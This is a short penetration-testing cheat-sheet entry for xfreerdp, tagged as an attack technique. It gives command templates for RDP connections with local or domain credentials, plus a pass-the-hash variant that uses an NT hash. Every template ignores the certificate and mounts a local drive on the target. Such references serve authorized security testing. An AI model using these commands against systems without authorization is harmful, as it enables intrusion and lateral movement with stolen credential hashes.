# xfreerdp

% rdp, windows
#plateform/linux  #target/remote  #protocol/rdp #port/3389 #cat/ATTACK/CONNECT 

##  connect local (creds)
```
xfreerdp /cert:ignore /u:<user> /p:<password> /v:<ip> /h:1024 /w:1640 /drive:<name|share>,<share|./> +drives
```

##  connect domain (creds)
```
xfreerdp /cert:ignore /u:<user>@<domain_fqdn> /p:<password> /v:<ip> /h:1024 /w:1640 /drive:<name|share>,<share|./> +drives
```


## connect domain (pth)
```
xfreerdp /cert:ignore /u:<user>@<domain_fqdn> /pth:<nt_hash>  /v:<ip> /h:1024 /w:1640 /drive:<name|share>,<share|./> +drives
```
